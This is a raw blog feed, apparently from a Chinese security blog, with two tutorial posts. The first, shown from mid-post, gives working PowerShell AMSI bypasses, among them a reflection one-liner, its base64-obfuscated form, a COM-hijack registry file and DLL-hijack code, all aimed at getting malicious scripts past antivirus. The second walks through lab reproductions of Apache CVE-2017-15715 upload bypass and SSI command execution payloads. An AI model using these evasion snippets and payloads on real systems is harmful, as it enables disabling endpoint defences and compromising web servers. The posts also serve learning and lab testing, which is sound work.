class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>在命令行中：直接使用<code>powershell.exe -version 2</code>改变运行版本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233125.png" alt="image-20211016162350929"></p><p>在脚本中：在脚本开头加入 <code>#requires -version 2</code></p><p>这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版 本执行</p><p>注：<strong>不是所有powershell脚本都能在2.0上执行，需要注意攻击脚本是否支持2.0</strong></p><h2 id="Bypass-AMSI-2"><a href="#Bypass-AMSI-2" class="headerlink" title="Bypass AMSI-2"></a>Bypass AMSI-2</h2><h3 id="改注册表"><a href="#改注册表" class="headerlink" title="改注册表"></a>改注册表</h3><h4 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h4><p>修改注册表</p><pre class="line-numbers language-none"><code class="language-none">HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置为 0，以禁用 AMSI</p><pre class="line-numbers language-none"><code class="language-none">Remove-Item -Path "HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable" -Recurse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是，改注册表并不是一种隐秘的方法，并且还需要管理员权限</p><h2 id="Bypass-AMSI-3"><a href="#Bypass-AMSI-3" class="headerlink" title="Bypass AMSI-3"></a>Bypass AMSI-3</h2><h3 id="脚本混淆"><a href="#脚本混淆" class="headerlink" title="脚本混淆"></a>脚本混淆</h3><h4 id="amsi-dll工作流程"><a href="#amsi-dll工作流程" class="headerlink" title="amsi.dll工作流程"></a>amsi.dll工作流程</h4><p>我们先来看amsi.dll的工作流程，方便我们去理解脚本混淆 为什么可以绕过amsi.dll</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233126.png" alt="image-20211016162536060"></p><p>AMSI其实只是一个 通道，真正识别是否是恶意软件或脚本的还是杀毒软件</p><p>AMSI把我们的恶意脚本交给杀毒软件，杀毒软件做识别。</p><p>大部分杀毒软件的识别方式还是特征码的方式，当 然杀毒软件也会把样本传到云端做机器学习或者人工分析，最后再反馈特征库给杀毒软件，导致我们恶意脚本被杀</p><h3 id="关闭AMSI"><a href="#关闭AMSI" class="headerlink" title="关闭AMSI"></a>关闭AMSI</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>既然AMSI只是一个通道，那么我们就可以把这个通道关闭，也就下一步阻断了杀毒软件</p><p>利用反射直接把判断是否要使用杀毒软件 进行扫描的变量始终改成false。这样AMSI就不会把我们的恶意脚本交给杀毒软件，而是直接返回 <code>AMSI_RESULT_NOT_DETECTED </code></p><h4 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h4><pre class="line-numbers language-none"><code class="language-none">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiI nitFailed','NonPublic,Static').SetValue($null,$true)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于这一行命令也是脚本，自身也会被AMSI传递给杀毒软件</p><h3 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h3><p>我们可以使用脚本混淆关闭AMSI的一行命令，进行绕过AMSI</p><h4 id="两个关键点："><a href="#两个关键点：" class="headerlink" title="两个关键点："></a>两个关键点：</h4><p>1.查杀的关键字符</p><p><code>System.Management.Automation.AmsiUtils</code> 和 <code>amsiInitFailed</code> </p><p>2.编码解码</p><h4 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h4><p>进行base64编码</p><pre class="line-numbers language-none"><code class="language-none">[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Bypass-AMSI-4"><a href="#Bypass-AMSI-4" class="headerlink" title="Bypass AMSI-4"></a>Bypass AMSI-4</h2><h3 id="暴力卸载amsi-dll"><a href="#暴力卸载amsi-dll" class="headerlink" title="暴力卸载amsi.dll"></a>暴力卸载amsi.dll</h3><p>在powershell启动的时候，会加载amsi.dll，然后调用其中的AmsiScanString或AmsiScanBuffer函数来进行检测</p><p>那么我们可以暴力卸载amsi.dll，但是我们要去考虑powershell进程也会崩掉</p><p>使用工具process hacker</p><p><a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233127.png" alt="image-20211016202005984"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233128.png" alt="image-20211016202040657"></p><p>Unpload之后就卸载了</p><p>不建议使用</p><h2 id="Bypass-AMSI-5-重点关注"><a href="#Bypass-AMSI-5-重点关注" class="headerlink" title="Bypass AMSI-5(重点关注)"></a>Bypass AMSI-5(重点关注)</h2><h3 id="劫持amsi-dll"><a href="#劫持amsi-dll" class="headerlink" title="劫持amsi.dll"></a>劫持amsi.dll</h3><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>由于研发人员使用 LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll</p><p>因此我们在 powerShell.exe同目录下放一个amsi.dll做劫持</p><p><code>amsi.dll</code>的默认目录：<code>c:\windows\system32\amsi.dll</code></p><p>还要考虑<code>amsi.dll</code>的导出函数，上面也有所提及</p><p>但是官方文档也是不全的，文档比较老了，目前新的amsi增加了其他几个导出函数</p><p>我这里使用了一个工具AheadLib</p><p>用IDA 分析 原理是一样的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233129.png" alt="image-20211016204700088"></p><pre class="line-numbers language-none"><code class="language-none">#include "pch.h"#include "iostream" BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    {        LPCWSTR appName = NULL;        typedef struct HAMSICONTEXT {            DWORD       Signature;            // "AMSI" or 0x49534D41            PWCHAR      AppName;           // set by AmsiInitialize            DWORD       Antimalware;       // set by AmsiInitialize            DWORD       SessionCount;      // increased by AmsiOpenSession        } HAMSICONTEXT;        typedef enum AMSI_RESULT {            AMSI_RESULT_CLEAN,            AMSI_RESULT_NOT_DETECTED,            AMSI_RESULT_BLOCKED_BY_ADMIN_START,            AMSI_RESULT_BLOCKED_BY_ADMIN_END,            AMSI_RESULT_DETECTED        } AMSI_RESULT;         typedef struct HAMSISESSION {            DWORD test;        } HAMSISESSION;         typedef struct r {            DWORD r;        };         void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);        void AmsiResultIsMalware(r);        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);        void AmsiUninitialize(HAMSICONTEXT amsiContext);    }    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>1.目录都需要管理员权限</p><p>2.落地的amsi.dll文件，这个dll文件需要考虑免杀问题</p><h2 id="Bypass-AMSI-6"><a href="#Bypass-AMSI-6" class="headerlink" title="Bypass AMSI-6"></a>Bypass AMSI-6</h2><h3 id="绕过AmsiScanBuffer"><a href="#绕过AmsiScanBuffer" class="headerlink" title="绕过AmsiScanBuffer()"></a>绕过AmsiScanBuffer()</h3><p>AmsiScanBuffer它本质上是用于扫描脚本内容的函数</p><p>函数原型</p><pre class="line-numbers language-none"><code class="language-none">HRESULT AmsiScanBuffer(  [in]           HAMSICONTEXT amsiContext,  [in]           PVOID        buffer,  [in]           ULONG        length,  [in]           LPCWSTR      contentName,  [in, optional] HAMSISESSION amsiSession,  [out]          AMSI_RESULT  *result);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233130.png" alt="image-20211016165309526"></p><p>关注函数中的这个参数，<code>length</code>是绕过的关键</p><p>此参数包含要扫描的字符串的长度。如果通过某种方式将该参数设置为常量值 0，则 AMSI 将有效地被绕过</p><p>具体可以看这里：<a href="https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/">https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/</a></p><h3 id="函数工作流程"><a href="#函数工作流程" class="headerlink" title="函数工作流程"></a>函数工作流程</h3><p>1.在PowerShell 命令提示符中，任何提供的内容将首先发送到 <code>AmsiScanBuffer()</code>，然后再执行<br>2.<code>AmsiScanBuffer() </code>将检查已注册的防病毒软件以确定是否已创建任何签名<br>3.如果内容被认为是恶意的，它将被阻止</p><h2 id="Bypass-AMSI-7"><a href="#Bypass-AMSI-7" class="headerlink" title="Bypass AMSI-7"></a>Bypass AMSI-7</h2><h3 id="COM-Server劫持"><a href="#COM-Server劫持" class="headerlink" title="COM Server劫持"></a>COM Server劫持</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>amsi.dll在老版本中使用 <code>CoCreateInstance()</code>函数调用<code>IID</code>和<code>CLSID</code>来实例化COM接口</p><p>而这个函数会先从注册表HKCU中找对应的DLL，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了</p><pre class="line-numbers language-none"><code class="language-none">Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba4357bb0072ec}][HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba4357bb0072ec}\InProcServer32]@="C:\\goawayamsi.dll"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>微软修复了这个问题</p><p>通过直接调用 amsi.dll 的 <code>DllGetClassObject()</code> 函数替换 <code>CoCreateInstance()</code>， 可以避免注册表解析</p><p>但是我们可以自己编译的 amsi.dll换成微软的老amsi.dll，这个dll可是微软自己签名的dll，不会被杀，然后再劫持注册表</p><h2 id="Bypass-AMSI-8"><a href="#Bypass-AMSI-8" class="headerlink" title="Bypass AMSI-8"></a>Bypass AMSI-8</h2><h3 id="Null字符绕过"><a href="#Null字符绕过" class="headerlink" title="Null字符绕过"></a>Null字符绕过</h3><h4 id="绕过AmsiScanString"><a href="#绕过AmsiScanString" class="headerlink" title="绕过AmsiScanString()"></a>绕过AmsiScanString()</h4><p>函数原型</p><pre class="line-numbers language-none"><code class="language-none">HRESULT AmsiScanString(  [in]           HAMSICONTEXT amsiContext,  [in]           LPCWSTR      string,  [in]           LPCWSTR      contentName,  [in, optional] HAMSISESSION amsiSession,  [out]          AMSI_RESULT  *result);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中string传入的就是我们的脚本，这个地方可以空字符截断（ps:空字符截断真是随处可见），然后我 们只需在我们恶意脚本开头加入空字符，就可以bypass了</p><p>修复方法</p><p>微软调用了其他函数-&gt;AmsiScanBuffer</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AMSI 作为阻止恶意软件执行的第一道防线，重要性不言而喻</p><p>由于扫描是基于签名的红队，威胁行为者可以通过采取各种策略来逃避 AMSI</p>]]></content>
      
      
      <categories>
          
          <category> AMSI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AMSI对抗小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache小结</title>
      <link href="/2021/10/28/apache/"/>
      <url>/2021/10/28/apache/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="Apache的简介"><a href="#Apache的简介" class="headerlink" title="Apache的简介"></a>Apache的简介</h2><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/Python等解释器编译到服务器中</p><p>这边我用phpstudy进行安装</p><h2 id="Apache的原理"><a href="#Apache的原理" class="headerlink" title="Apache的原理"></a>Apache的原理</h2><p>一次完整的WEB请求流程</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180939.png" alt="1619658355135"></p><p>从request开始，到response结束</p><p>是一次Apache和PHP配合的一次WEB请求，Apache在前，PHP在后</p><p>Apache本身是不支持PHP解析的，是通过SAPI进行通信，那 Apache如何和SAP通信呢？Apache怎么知道什么类型的文件要解析为PHP？</p><pre class="line-numbers language-none"><code class="language-none">#加载php5_module模块LoadModule php5_module php5apache2_2.dll的路径#添加可以执行php的文件类型，让.php文件类型解析为PHP AddType application/x-httpd-php.php#或者将 AddType变为下面的(在 Apache2.4.0~2.4.29中默认使用了该方式)&lt;FiLesMatch \.php$&gt;SetHandler application/x-httpd-php&lt;/FiLesMatch&gt;以及&lt;IfModule dir_moduleDirectoryIndex index.html index.html index.php index.phtml&lt;/IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Apache通过 LoadModule来加载php5_module模块( php5apache2_2.dll)</p><p>这样做的目的是让Apache加载php5_module模块来解析PHP文件。</p><p>意思其实就是用 LoadModule来加载php5_module。也就是把php作为 Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码</p><p>调用过程概况</p><pre class="line-numbers language-none"><code class="language-none">HTTP-&gt;Apahce-&gt;php5_module-&gt;sapi-&gt;php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Apache的目录结构"><a href="#Apache的目录结构" class="headerlink" title="Apache的目录结构"></a>Apache的目录结构</h2><p><img src="https://img-blog.csdnimg.cn/20210422081742843.png" alt="在这里插入图片描述"></p><pre class="line-numbers language-none"><code class="language-none">bin------------存放常用的命令工具，例如httpd cgi-bin--------存放 Linux下常用的命令，例如xxx.sh conf-----------Linux的配置相关文件，例如httpd．．conf error----------错误记录htdocs---------放网站源码icons----------网站图标logs-----------日志manual---------手册modules--------扩展模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Apche对文件名扩展名的定义"><a href="#Apche对文件名扩展名的定义" class="headerlink" title="Apche对文件名扩展名的定义"></a>Apche对文件名扩展名的定义</h2><p><img src="https://img-blog.csdnimg.cn/20210422194718260.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210422194829801.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210422195053434.png" alt="在这里插入图片描述"></p><p>它是不可以解析php的！！！</p><h2 id="Apache的解析漏洞-CVE-2017-15715"><a href="#Apache的解析漏洞-CVE-2017-15715" class="headerlink" title="Apache的解析漏洞(CVE-2017-15715)"></a>Apache的解析漏洞(CVE-2017-15715)</h2><p>搞一张图片 搞一个未知的扩展名</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180940.png" alt="1619672095365"></p><p>然后我们访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180941.png" alt="1619672108239"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180942.png" alt="1619672124599"></p><p><img src="https://img-blog.csdnimg.cn/20210422082240513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210422082157663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里它不是apache解析的php文件</p><p>是php解析的</p><p>继续提升版本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180943.png" alt="1619672990629"></p><p>要安装一个这个vc11-86</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180944.png" alt="1619672532589"></p><p>php常见运行方式有 apache的模块模式(分为mod_php和mod_cgi)cgi模式fast-cgi模式</p><pre class="line-numbers language-none"><code class="language-none">1.使用 module模式与php结合的所有版本 apache存在未知扩展名解析漏洞2.使用 fastcgi模式与php结合的所有版本 apache不存在此漏洞。3.并且，想利用此漏洞必须保证文件扩展名中至少带有一个`.php`，否则将默认被作为`txt/html`文档处理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后访问一下 可以看到是fast-cgi模式</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180945.png" alt="1619672975811"></p><p>我们访问<code>phpinfo.php.xxx</code> 会报500的错误</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180946.png" alt="1619673074233"></p><h3 id="kali操作"><a href="#kali操作" class="headerlink" title="kali操作"></a>kali操作</h3><p>kali是自带apache的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180947.png" alt="1619673403380"></p><p>进行配置一下就可以了</p><p>开启apache服务</p><pre class="line-numbers language-none"><code class="language-none">/etc/init.d/apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问一下 成功开启</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180948.png" alt="1619673442975"></p><p>php的版本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180949.png" alt="1619673481010"></p><p>kali下apache默认的网站根目录：</p><pre class="line-numbers language-none"><code class="language-none">/var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写一个phpinfo的2.php文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180950.png" alt="1619673943395"></p><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180951.png" alt="1619673974508"></p><h3 id="深入解析一下"><a href="#深入解析一下" class="headerlink" title="深入解析一下"></a>深入解析一下</h3><p>去这个目录下</p><pre class="line-numbers language-none"><code class="language-none">/etc/apache2/mods-enabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180952.png" alt="1619674158602"></p><p>我们打开分析一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180953.png" alt="1619674267163"></p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch ".+\.ph(ar|p|tml)$"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以 <code>phar</code>，<code> php</code>， <code>phtml</code> 结尾的文件会被 apache当做php解析</p><p>apache解析漏洞的根本原因就是这个<code>$</code> </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180954.png" alt="1619674389982"></p><p>当我们把<code>$</code> 换成<code>\.</code>时</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180955.png" alt="1619674469735"></p><p>搞一个2.php.xxx</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180956.png" alt="1619674542411"></p><p>重启一下apache服务</p><pre class="line-numbers language-none"><code class="language-none">service apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问一下 成功解析了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180957.png" alt="1619674629300"></p><h3 id="总结利用条件"><a href="#总结利用条件" class="headerlink" title="总结利用条件"></a>总结利用条件</h3><pre class="line-numbers language-none"><code class="language-none">1.使用 module模式，且正则符合条件2.文件扩展名中至少带有一个.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Apache-HTTPD换行解析漏洞"><a href="#Apache-HTTPD换行解析漏洞" class="headerlink" title="Apache HTTPD换行解析漏洞"></a>Apache HTTPD换行解析漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>上传一个后缀末尾包含换行符的文件，来绕过 FilesMatch。</p><p>绕过 FilesMatch不一定能被PHP解析这个漏洞可以用来绕过文件上传黑名单限制</p><p>举例：</p><pre class="line-numbers language-none"><code class="language-none">a001.php\x0a--&gt;a001.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该漏洞属于用户配置不当</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>apache ：2.4.0~2.4.29版本</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>Kail的Apache的版本不符合</p><p>我这边上Ubuntu进行复现</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180958.png" alt="1619159698311"></p><p>Ubuntu安装docker命令</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get update sudo apt install curl curl -s https://get.docker.com/ | sh   sudo apt install python curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.pysudo python get-pip.pypip install docker-compose sudo apt install docker-composedocker-compose -vdocker -vsudo service docker start 启动docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723180959.png" alt="1619160628787"></p><p>安装完成 那么 开始安装vulhub</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install gitgit clone https://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启环境</p><pre class="line-numbers language-none"><code class="language-none">cd vulhub/httpd/CVE-2017-15715/ sudo docker-compose build sudo docker-compose up -d docker ps <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.179:8080/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181000.png" alt="1619161996927"></p><p>部署成功了</p><p>开始上传</p><p>直接上传phpinfo.php 是失败的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181001.png" alt="1619162125671"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181002.png" alt="1619162134440"></p><p>抓包进行修改</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181003.png" alt="1619162223821"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181004.png" alt="1619162269859"></p><p>加入一个点</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181005.png" alt="1619162289190"></p><p>修改后发送到重放器</p><p>去看看Hex</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181006.png" alt="1619162863417"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181007.png" alt="1619163076557"></p><p><code>.</code>的Hex–&gt;2e</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181008.png" alt="1619163098345"></p><p>改成0a  成功上传</p><p>然后我们进行访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.179:8080/phpinfo.php%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181009.png" alt="1619163257210"></p><p>成功上传并解析</p><p>分析原因</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181010.png" alt="1619163418256"></p><p>后台是通过黑名单方式过滤了php后缀的文件，根据最开始的知识，什么样的文件算是php文件呢？在有定义，这句话的意思是以php结尾的文件都算php文件，在正则中表示匹配输入字符串的结尾位置。如果设置了 RegExp对象的 Multiline属性，则也匹配<code>\n</code>或<code>\r</code><br>恰好，我们在文件末尾加了0x0a（n），所以被匹配成功了。</p><h3 id="0x0a和0x0d"><a href="#0x0a和0x0d" class="headerlink" title="0x0a和0x0d"></a>0x0a和0x0d</h3><pre class="line-numbers language-none"><code class="language-none">1.0x0d \r CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置2.0x0a \n CL这三者代表换行，是同一个东西，换行至下一行行首起始位置；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.升级到最新版本<br>2.或将上传的文件重命名为为<code>时间戳+随机数+.jpg</code>的格式并禁用上传文件目录执行脚本权限</p><h2 id="4、Apache-SsI远程命令执行漏洞"><a href="#4、Apache-SsI远程命令执行漏洞" class="headerlink" title="4、Apache SsI远程命令执行漏洞"></a>4、Apache SsI远程命令执行漏洞</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache全版本（支持SS与cG）</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>绕过服务器策略，上传 webshell</p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>ssi：是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在 Apache官网对SS的定义</p><p>简单来讲，就是ssi可以在HTML中加入特定的指令，也可以引入其他的页面。</p><p>开启ssi需要单独配置 Apache，可以参考ssi配置</p><pre class="line-numbers language-none"><code class="language-none">https://httpd.apache.org/docs/2.4/howto/ssi.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>总结呢，就是：ssi.html也可以执行命令</p><p>创建a001.shtml  写入如下命令 进行上传</p><h3 id="包含ssi指令的文件"><a href="#包含ssi指令的文件" class="headerlink" title="包含ssi指令的文件"></a>包含ssi指令的文件</h3><pre class="line-numbers language-none"><code class="language-none">&lt;pre&gt;&lt;!--#exec cmd="whoami" --&gt;&lt;/pre&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>同样是用vulhub进行启动</p><pre class="line-numbers language-none"><code class="language-none">sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181011.png" alt="1619164572259"></p><p>写入ssi指令的文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;pre&gt;&lt;!--#exec cmd="whoami" --&gt;&lt;/pre&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>文件名保存为<code>a001.shtml</code>，这个后缀取决于 Apache的配置，默认是此后缀</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181012.png" alt="1619164582678"></p><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723181013.png" alt="1619164655934"></p><p>这里的思路 比如上传webshell  或者拿反弹shell都是可以的</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BypassUAC学习</title>
      <link href="/2021/10/28/bypassuac-xue-xi/"/>
      <url>/2021/10/28/bypassuac-xue-xi/</url>
      
